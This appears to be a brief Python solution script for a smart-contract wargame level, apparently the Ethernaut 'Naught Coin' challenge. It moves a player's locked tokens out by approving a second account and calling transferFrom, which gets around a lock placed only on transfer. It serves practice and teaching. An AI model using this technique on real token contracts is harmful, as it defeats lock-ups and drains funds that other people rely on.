from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    spender = a[2]
    amount = instance.balanceOf(player)
    instance.approve(spender, amount, {'from': player})
    instance.transferFrom(player, spender, amount, {'from': spender})

